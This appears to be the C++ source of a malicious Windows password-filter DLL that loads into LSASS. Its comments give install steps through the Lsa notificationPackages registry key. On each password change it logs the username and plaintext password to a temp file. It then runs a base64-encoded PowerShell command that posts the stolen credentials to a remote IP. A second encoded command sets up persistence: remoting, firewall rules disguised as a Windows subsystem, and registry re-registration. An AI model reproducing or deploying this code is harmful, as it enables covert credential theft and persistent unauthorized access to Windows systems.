//USAGE
//this library compiles into a dll file
//place this dll file in the system32 directory
//edit the regkey HKLM:\System\CurrentControlSet\Control\Lsa -> notificationPackages
//add the name of the dll you placed into sys32 (minus the .dll part)
//restart the box.
//the dll should now be visible in procexp loaded under LSASS.exe
//passwords should be saved in C:\Windows\temp\lsass.log

//
// Asa Horn
// aoh9470@rit.edu
//

#include <Windows.h>
#include <SubAuth.h>

//////// Helper functions
//Does persistence things
NTSTATUS justPersistenceThings(){
    system("powershell.exe -EncodedCommand RQBuAGEAYgBsAGUALQBQAFMAUgBlAG0AbwB0AGkAbgBnADsAJABlAHgAaQBzAHQAaQBuAGcAUgB1AGwAZQAgAD0AIABHAGUAdAAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7AGkAZgAgACgALQBuAG8AdAAgACQAZQB4AGkAcwB0AGkAbgBnAFIAdQBsAGUAKQAgAHsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBXAGkAbgBkAG8AdwBzACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFMAdQBiAHMAeQBzAHQAZQBtACIAIAAtAEQAaQByAGUAYwB0AGkAbwBuACAASQBuAGIAbwB1AG4AZAAgAC0ATABvAGMAYQBsAFAAbwByAHQAIAA1ADkAOAA1ACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAOwBOAGUAdwAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAANQA5ADgANQAgAC0AUAByAG8AdABvAGMAbwBsACAAVABDAFAAIAAtAEEAYwB0AGkAbwBuACAAQQBsAGwAbwB3ADsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBIAFQAVABQACAAbwB1AHQAIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAAOAAwACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAfQBSAGUAbQBvAHYAZQAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiACAALQBWAGEAbAB1AGUAIAAiAHIAYQBzAHMAZgBtAGAAcgBgAG4AcwBjAGUAYwBsAGkAYAByAGAAbgBsAGkAYgBmAGkAbAB0AGUAcgAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwA=");

    // Enable-PSRemoting;
    // $existingRule = Get-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -ErrorAction SilentlyContinue;
    // if (-not $existingRule) {
    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow;
    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Outbound -LocalPort 5985 -Protocol TCP -Action Allow;
    //      New-NetFirewallRule -DisplayName "HTTP out" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Allow}
    // Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages";
    // New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages" -Value "rassfm`r`nscecli`r`nlibfilter" -PropertyType MultiString

    return 0;
}

//Concatante two PUNICODE strings.
//I really hope you like pointer silliness
//because I don't
// in: String1, String2: the strings to stick together
// out: Result: a pointer to populate with the result
NTSTATUS catUTF16LEStr(
        _In_ PUNICODE_STRING String1,
        _In_ PUNICODE_STRING String2,
        _Out_ PUNICODE_STRING Result
) {
    if (!String1 || !String2 || !Result) {
        return STATUS_INVALID_PARAMETER;
    }

    // Calculate the total length needed for the result
    USHORT totalLength = String1->Length + String2->Length;

    // Allocate memory for the result buffer
    Result->Buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, totalLength + sizeof(WCHAR));
    if (!Result->Buffer) {
        return STATUS_NO_MEMORY;
    }

    // Copy the first string
    memcpy(Result->Buffer, String1->Buffer, String1->Length);

    // Copy the second string
    memcpy((BYTE*)Result->Buffer + String1->Length, String2->Buffer, String2->Length);

    // Set the length and maximum length of the result
    Result->Length = totalLength;
    Result->MaximumLength = totalLength + sizeof(WCHAR);

    // Null-terminate the result string
    *(PWCHAR)((BYTE*)Result->Buffer + totalLength) = L'\0';

    return STATUS_SUCCESS;
}

//Write a *unicodestring to a hardcoaded file
//For writing the passwords
//takes: PUNICODE_STRING to write
//returns: status
BOOL writeToFile(PUNICODE_STRING text) {
    //open a file (the janky windows way)
    HANDLE hFile = CreateFileW(
            L"C:\\Windows\\temp\\lsass.log",
            FILE_APPEND_DATA,
            FILE_SHARE_READ,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    //debug
    if (hFile == INVALID_HANDLE_VALUE) {
        //printf("bad handle: %d", hFile);
        return FALSE;
    }
    // Move file pointer to the end for appending
    SetFilePointer(hFile, 0, NULL, FILE_END);

    //Do you see why I hate stupid unicode now
    // Write BOM (byte order mark) if the file is new (just created)
    // this tells windows that it is looking at unicode rather than ascii
    // and prevents null btyes between ascii letters.
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        WORD bom = 0xFEFF;
        DWORD bytesWritten;
        WriteFile(hFile, &bom, sizeof(bom), &bytesWritten, NULL);
    }

    //write the file to disk using fileapi (thanks windows)
    DWORD bytesWritten;
    BOOL result = WriteFile(
            hFile,
            text->Buffer,
            text->Length,
            &bytesWritten,
            NULL
    );

    if(result != TRUE) {
        //std::cerr << "error writing";
    }

    CloseHandle(hFile);
    return 0;
}




//boilerplate dll (I think. TBH this could be doing nothing, but I am not touching it now)
BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

//on load
// True for successful load, false for failure
extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
    return TRUE; //error handling / init is lame
}

//called when user is attempting to change password
//return FALSE to deny change, TRUE to accept
//this function being called does not mean the change was successful
extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
    justPersistenceThings();
    return TRUE; //not going to actually prevent password changes right now
}

//called to notify that a password change has successfully occurred
//return 0 for OK, other number for error code
extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING uname, ULONG RelativeId, PUNICODE_STRING password){
    //build the unicode chars for building the output
    wchar_t singleColon = L':';
    UNICODE_STRING colon = { 2, 2, &singleColon };

    wchar_t singleNL = L'\n';
    UNICODE_STRING newline = { 2, 2, &singleNL };

    writeToFile(uname);
    writeToFile(&colon);
    writeToFile(password);
    writeToFile(&newline);

    //call the other executable for networking
    system(R"("powershell.exe -EncodedCommand "JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=")");

    //above blob is this script
    //$filePath = "C:\Windows\Temp\lsass.log"
    //$serverUrl = "192.168.109.131/post"
    //$lastLine = Get-Content -Path $filePath | Select-Object -Last 1
    //Invoke-RestMethod -Uri $serverUrl -Method Post -Body $lastLine -ContentType "text/plain; charset=utf-16le"


    return 0;
}
